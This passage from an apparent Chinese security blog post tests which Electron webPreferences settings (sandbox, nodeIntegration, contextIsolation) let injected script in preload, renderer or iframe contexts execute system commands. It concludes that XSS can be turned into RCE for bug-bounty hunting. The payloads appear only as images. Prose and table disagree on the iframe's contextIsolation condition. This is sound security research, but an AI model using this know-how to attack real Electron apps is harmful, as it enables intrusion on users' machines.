+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813171305546.png" alt="image-20250813171305546"></p>
+<h4 id="iframe-3">iframe</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813171408725.png" alt="image-20250813171408725"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813171511550.png" alt="image-20250813171511550"></p>
+<h4 id="小结-3">小结</h4>
+<table>
+<thead>
+<tr>
+<th>测试执行JS点</th>
+<th>是/否可以执行NodeJS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>预加载脚本preload</td>
+<td><strong>是！！！</strong></td>
+</tr>
+<tr>
+<td>渲染页面</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe + window.open</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<h3 id="配置3">配置3</h3>
+<p>配置情况：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">sandbox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<h4 id="预加载脚本preload-3">预加载脚本preload</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813184951588.png" alt="image-20250813184951588"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813185013085.png" alt="image-20250813185013085"></p>
+<h4 id="渲染脚本-2">渲染脚本</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813185228740.png" alt="image-20250813185228740"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813185305285.png" alt="image-20250813185305285"></p>
+<h4 id="iframe-4">iframe</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813185608997.png" alt="image-20250813185608997"></p>
+<p>运行，发现没弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813185712866.png" alt="image-20250813185712866"></p>
+<h4 id="小结-4">小结</h4>
+<table>
+<thead>
+<tr>
+<th>测试执行JS点</th>
+<th>是/否可以执行NodeJS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>预加载脚本preload</td>
+<td>否</td>
+</tr>
+<tr>
+<td>渲染页面</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe + window.open</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<h3 id="配置4">配置4</h3>
+<p>配置情况：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">sandbox:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<h4 id="预加载脚本preload-✔️-2">预加载脚本preload ✔️</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813185936735.png" alt="image-20250813185936735"></p>
+<p>运行，成功弹出计算器！！！</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813190002025.png" alt="image-20250813190002025"></p>
+<h4 id="渲染脚本-✔️">渲染脚本 ✔️</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813191715764.png" alt="image-20250813191715764"></p>
+<p>运行，成功弹出计算器！！！</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813191807889.png" alt="image-20250813191807889"></p>
+<h4 id="iframe-5">iframe</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813191926349.png" alt="image-20250813191926349"></p>
+<p>运行，发现没有弹计算器，失败。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813192034695.png" alt="image-20250813192034695"></p>
+<h4 id="小结-5">小结</h4>
+<table>
+<thead>
+<tr>
+<th>测试执行JS点</th>
+<th>是/否可以执行NodeJS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>预加载脚本preload</td>
+<td><strong>是！！！</strong></td>
+</tr>
+<tr>
+<td>渲染页面</td>
+<td><strong>是！！！</strong></td>
+</tr>
+<tr>
+<td>iframe</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe + window.open</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<h3 id="配置6">配置6</h3>
+<p>配置情况：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">sandbox:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<h4 id="预加载脚本preload-✔️-3">预加载脚本preload ✔️</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813192811068.png" alt="image-20250813192811068"></p>
+<p>运行，成功弹出计算器！！！</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813192841807.png" alt="image-20250813192841807"></p>
+<h4 id="渲染脚本-3">渲染脚本</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813192920993.png" alt="image-20250813192920993"></p>
+<p>失败，未成功弹出计算器。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813193011605.png" alt="image-20250813193011605"></p>
+<h4 id="iframe-6">iframe</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813193805318.png" alt="image-20250813193805318"></p>
+<p>失败，未成功弹出计算器。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813193835196.png" alt="image-20250813193835196"></p>
+<h4 id="小结-6">小结</h4>
+<table>
+<thead>
+<tr>
+<th>测试执行JS点</th>
+<th>是/否可以执行NodeJS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>预加载脚本preload</td>
+<td><strong>是！！！</strong></td>
+</tr>
+<tr>
+<td>渲染页面</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe + window.open</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<h3 id="配置7">配置7</h3>
+<p>配置情况：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">sandbox:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<h4 id="预加载脚本preload-4">预加载脚本preload</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813202006386.png" alt="image-20250813202006386"></p>
+<p>运行，失败，未弹出计算器。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813202039718.png" alt="image-20250813202039718"></p>
+<h4 id="渲染脚本-4">渲染脚本</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813202248359.png" alt="image-20250813202248359"></p>
+<p>运行，失败，未成功弹出计算器。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813202452610.png" alt="image-20250813202452610"></p>
+<h4 id="iframe-7">iframe</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813202749553.png" alt="image-20250813202749553"></p>
+<p>运行，失败，未弹出计算器。</p>
+<img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813202708369.png" alt="image-20250813202708369" style="zoom:50%;">
+<h4 id="小结-7">小结</h4>
+<table>
+<thead>
+<tr>
+<th>测试执行JS点</th>
+<th>是/否可以执行NodeJS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>预加载脚本preload</td>
+<td>否</td>
+</tr>
+<tr>
+<td>渲染页面</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe + window.open</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<h3 id="配置8">配置8</h3>
+<p>配置情况：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">sandbox:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<h4 id="预加载脚本preload-✔️-4">预加载脚本preload ✔️</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813202955376.png" alt="image-20250813202955376"></p>
+<p>运行，成功弹出计算器！！！</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813203040504.png" alt="image-20250813203040504"></p>
+<h4 id="渲染脚本-5">渲染脚本</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813204559849.png" alt="image-20250813204559849"></p>
+<p>失败，未弹出计算器。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813204628493.png" alt="image-20250813204628493"></p>
+<h4 id="iframe-8">iframe</h4>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813204718885.png" alt="image-20250813204718885"></p>
+<p>失败，未弹出计算器</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813204743266.png" alt="image-20250813204743266"></p>
+<h4 id="小结-8">小结</h4>
+<table>
+<thead>
+<tr>
+<th>测试执行JS点</th>
+<th>是/否可以执行NodeJS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>预加载脚本preload</td>
+<td><strong>是！！！</strong></td>
+</tr>
+<tr>
+<td>渲染页面</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe</td>
+<td>否</td>
+</tr>
+<tr>
+<td>iframe + window.open</td>
+<td>否</td>
+</tr>
+</tbody>
+</table>
+<h2 id="总结">总结</h2>
+<p>了解了前面介绍的一些概念，针对于<code>Electron v37.2.6</code>版本，我对8种的安全配置进行了测试。测试发现<strong>只要是<code>sandbox</code>设置为<code>true</code>的均不能成功弹出计算器！不论nodeIntegration和contextIsolation什么配置。<strong>还发现了</strong>在网页中嵌入<code>&lt;iframe&gt;</code>然后src引入存在payload的页面，发现都没有弹计算器，不论什么配置，且iframe的src引入的页面，再使用window.open打开一个存在payload的页面，依然是不能弹计算器的。</strong></p>
+<p>可以得到如下的结论：</p>
+<table>
+<thead>
+<tr>
+<th>安全配置</th>
+<th>预加载脚本preload</th>
+<th>渲染页面</th>
+<th>iframe</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>nodeIntegration</td>
+<td>不影响</td>
+<td>true</td>
+<td></td>
+</tr>
+<tr>
+<td>contextIsolation</td>
+<td>不影响</td>
+<td>false</td>
+<td></td>
+</tr>
+<tr>
+<td>sandbox</td>
+<td>false</td>
+<td>false</td>
+<td></td>
+</tr>
+<tr>
+<td>额外条件</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>这里不谈绕过和覆盖的问题！</p>
+</blockquote>
+<p>由上述表格可以看到：</p>
+<ul>
+<li><strong>在预加载脚本preload中，不论<code>nodeIntegration</code>和<code>contextIsolation</code>的配置是什么，只要<code>sandbox</code>为<code>false</code>，就可以弹计算器，即就可执行系统命令。</strong></li>
+<li><strong>在渲染页面中，<code>nodeIntegration</code>配置为<code>true</code>，<code>contextIsolation</code>配置为<code>false</code>，<code>sandbox</code>配置为<code>false</code>才可以弹计算器，执行系统命令。</strong></li>
+</ul>
+<p>有了这些，那我们作为挖掘SRC的，如何去挖掘漏洞呢？</p>
+<p><strong>找预加载脚本preload和渲染网页的XSS漏洞！利用XSS漏洞实现RCE！</strong></p>
+<p>首先大方向<code>sandbox</code>要配置为<code>false</code>才行，对于预加载脚本preload存在XSS，可以直接执行系统命令。对于渲染页面存在XSS漏洞，需要配置是<code>nodeIntegration</code>为<code>true</code>，<code>contextIsolation</code>为<code>false</code>，这样也可直接执行系统命令。</p>
+<p><strong>对于渲染页面存在XSS漏洞，<code>sandbox</code>为<code>false</code>，一定要<code>nodeIntegration</code>为<code>true</code>，<code>contextIsolation</code>为<code>false</code>吗？</strong></p>
+<p><strong>不一定！前面我也有介绍到了IPC通信！！！主进程和渲染进程之间通信，通过预加载脚本preload进行架桥连接，若preload中存在一些危险的函数，可以执行js，也是可能存在XSS -&gt; RCE的。</strong></p>
+<h2 id="补充部分">补充部分</h2>
+<p>根据大佬的文章<sup class="footnote-ref"><a href="#fn1" id="fnref1:1">[1:1]</a></sup>，经过测试，在<code>Electron 20.0</code>以及以后的版本并不是默认<code>sandbox: true</code>，或者说并不完全等于显式地设置<code>sandbox: true</code>。我在前面的测试例子中都是直接将<code>webPreferences</code>配置中的<code>sandbox</code>直接显示地写出来了，<strong>那如果不写这个参数呢？默认的<code>sandbox</code>的配置一定是<code>true</code>吗？答案是不一定！</strong></p>
+<p>大佬的结论是：当<code>nodeIntegration</code>、<code>nodeIntegrationInSubFrames</code>、<code>nodeIntegrationInWorker</code>被设置为<code>true</code>时，<code>sandbox</code>对于<code>Node.js</code>的保护效果就会失效，当<code>contextIsolation</code>被设置为<code>false</code>时，<code>sandbox</code>对于上下文隔离的保护效果就会失效。</p>
+<h3 id="我的测试">我的测试</h3>
+<p>我对于大佬的结论进行了测试，发现结论不够严谨。结论中并没有说明<code>nodeIntegration</code>、<code>nodeIntegrationInSubFrames</code>和<code>nodeIntegrationInWorker</code>三个都为<code>true</code>，<code>sandbox</code>对于<code>Node.js</code>的保护效果就会失效，还是说某几个为<code>true</code>才会失效？</p>
+<p>单独开一个<code>nodeIntegrationInSubFrames: true</code>，配合<code>contextIsolation: false</code>，并不会弹出计算器。</p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813224836417.png" alt="image-20250813224836417"></p>
+<p>单开一个<code>nodeIntegration: true</code>，配合<code>contextIsolation: false</code>，即可在渲染器中实现弹出计算器。这里可以弹计算器，符合了前面说的<strong>启用了<code>nodeIntegration</code>，<code>sandbox</code>会被禁用。</strong></p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250813225057389.png" alt="image-20250813225057389"></p>
+<p><strong>经过测试发现，在<code>sandbox</code>不配置，默认的情况下，发现只要<code>nodeIntegration</code>或者<code>nodeIntegrationInWorker</code>有一个为<code>true</code>，preload中就可以执行系统命令。</strong></p>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250814134656484.png" alt="image-20250814134656484"></p>
+<p>我还发现，在下面的配置下，渲染器中的<code>iframe</code>是可以弹计算器的，而且要是严格的这个配置。但是发现，<code>window.open</code>是不会弹计算器的。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nodeIntegration:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">nodeIntegrationInSubFrames:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">contextIsolation:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20250814135628734.png" alt="image-20250814135628734"></p>
+<h3 id="我的结论">我的结论</h3>
+<p>根据上面的多个测试，在<code>Electron v37.2.6</code>版本下的，我的结论如下：</p>
+<p>对于<strong>显式的写出了<code>sandbox</code>的配置</strong>，遵循测试的表格：</p>
+<table>
+<thead>
+<tr>
+<th>安全配置</th>
+<th>预加载脚本preload</th>
+<th>渲染页面</th>
+<th>iframe</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>nodeIntegration</td>
+<td>不影响</td>
+<td>true</td>
+<td></td>
+</tr>
+<tr>
+<td>contextIsolation</td>
+<td>不影响</td>
+<td>false</td>
+<td></td>
+</tr>
+<tr>
+<td>sandbox</td>
+<td>false</td>
+<td>false</td>
+<td></td>
+</tr>
+<tr>
+<td>额外条件</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>在预加载脚本preload中，不论<code>nodeIntegration</code>和<code>contextIsolation</code>的配置是什么，只要<code>sandbox</code>为<code>false</code>，就可以弹计算器，即就可执行系统命令。</strong></li>
+<li><strong>在渲染页面中，<code>nodeIntegration</code>配置为<code>true</code>，<code>contextIsolation</code>配置为<code>false</code>，<code>sandbox</code>配置为<code>false</code>才可以弹计算器，执行系统命令。</strong></li>
+</ul>
+<p><strong>对于未写出<code>sandbox</code>的配置：</strong></p>
+<p><strong>对于预加载脚本preload：</strong></p>
+<p><code>sandbox</code>默认是为<code>true</code>，<code>nodeIntegration</code>或<code>nodeIntegrationInWorker</code>设置为<code>true</code>时，<strong>二者只要有一个<code>true</code>就可</strong>，<code>sandbox</code>就会被禁用，preload中就可以执行系统命令。</p>
+<p><strong>对于渲染页面：</strong></p>
+<p>在渲染页面中，<code>nodeIntegration</code>为<code>true</code>和<code>contextIsolation</code>为<code>false</code>，必须这样，渲染页面中才能执行系统命令。</p>
+<p>在<code>iframe</code>中，必须要<code>nodeIntegration</code>为<code>true</code>，<code>nodeIntegrationInSubFrames</code>为<code>true</code>和<code>contextIsolation</code>为<code>true</code>的情况下，渲染器的<code>iframe</code>才能执行系统命令。</p>
+<table>
+<thead>
+<tr>
+<th>安全配置</th>
+<th>预加载脚本preload</th>
+<th>渲染页面</th>
+<th>iframe</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>nodeIntegration</td>
+<td>true</td>
+<td>true</td>
+<td>true</td>
+</tr>
+<tr>
+<td>nodeIntegrationInSubFrames</td>
+<td>不影响</td>
+<td>不影响</td>
+<td>true</td>
+</tr>
+<tr>
+<td>nodeIntegrationInWorker</td>
+<td>true</td>
+<td>不影响</td>
+<td>不影响</td>
+</tr>
+<tr>
+<td>contextIsolation</td>
+<td>不影响</td>
+<td>false</td>
+<td>false</td>
+</tr>
+<tr>
+<td>额外条件</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="参考">参考</h2>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/Just-Hack-For-Fun/Electron-Security">https://github.com/Just-Hack-For-Fun/Electron-Security</a> <a href="#fnref1" class="footnote-backref">↩︎</a> <a href="#fnref1:1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/">https://www.electronjs.org/zh/docs/latest/</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn3" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/blog/electron-22-0#utilityprocess-api-36089">https://www.electronjs.org/zh/blog/electron-22-0#utilityprocess-api-36089</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn4" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/">https://www.electronjs.org/zh/</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn5" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/process-model">https://www.electronjs.org/zh/docs/latest/tutorial/process-model</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn6" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/security#2-%E4%B8%8D%E8%A6%81%E4%B8%BA%E8%BF%9C%E7%A8%8B%E5%86%85%E5%AE%B9%E5%90%AF%E7%94%A8-nodejs-%E9%9B%86%E6%88%90">https://www.electronjs.org/zh/docs/latest/tutorial/security#2-不要为远程内容启用-nodejs-集成</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn7" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/security#3-%E4%B8%8A%E4%B8%8B%E6%96%87%E9%9A%94%E7%A6%BB">https://www.electronjs.org/zh/docs/latest/tutorial/security#3-上下文隔离</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn8" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/process-model">https://www.electronjs.org/zh/docs/latest/tutorial/process-model</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn9" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/ipc#%E6%A8%A1%E5%BC%8F-2%E6%B8%B2%E6%9F%93%E5%99%A8%E8%BF%9B%E7%A8%8B%E5%88%B0%E4%B8%BB%E8%BF%9B%E7%A8%8B%E5%8F%8C%E5%90%91">https://www.electronjs.org/zh/docs/latest/tutorial/ipc#模式-2渲染器进程到主进程双向</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn10" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/sandbox">https://www.electronjs.org/zh/docs/latest/tutorial/sandbox</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn11" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/security#4-%E5%90%AF%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B2%99%E7%9B%92%E5%8C%96">https://www.electronjs.org/zh/docs/latest/tutorial/security#4-启用进程沙盒化</a> <a href="#fnref11" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn12" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/api/protocol#protocolregisterschemesasprivilegedcustomschemes">https://www.electronjs.org/zh/docs/latest/api/protocol#protocolregisterschemesasprivilegedcustomschemes</a> <a href="#fnref12" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn13" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/security#6-%E4%B8%8D%E8%A6%81%E7%A6%81%E7%94%A8-websecurity">https://www.electronjs.org/zh/docs/latest/tutorial/security#6-不要禁用-websecurity</a> <a href="#fnref13" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn14" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.electronjs.org/zh/docs/latest/tutorial/security#7-content-security-policy%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5">https://www.electronjs.org/zh/docs/latest/tutorial/security#7-content-security-policy内容安全策略</a> <a href="#fnref14" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/08/07/Self-XSS%E5%8F%98XSS%E7%9A%84%E6%96%B9%E6%B3%95/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-08-15 11:06:42
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/RCE/" title="RCE">
+                        #RCE
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Electron/" title="Electron">
+                        #Electron
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/" title="客户端安全">
+                        <b>#</b> 客户端安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/08/16/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E9%83%A8%E5%88%86/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Electron%E7%AE%80%E4%BB%8B"><span class="toc-text">Electron简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Electron%E6%9E%B6%E6%9E%84"><span class="toc-text">Electron架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E8%BF%9B%E7%A8%8B"><span class="toc-text">主进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B"><span class="toc-text">渲染进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC-preload"><span class="toc-text">预加载脚本(preload)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%94%A8%E8%BF%9B%E7%A8%8B"><span class="toc-text">实用进程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95Electron"><span class="toc-text">远程调试Electron</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-text">涉及安全问题的配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nodeIntegration"><span class="toc-text">nodeIntegration[6]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#contextIsolation"><span class="toc-text">contextIsolation[7]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 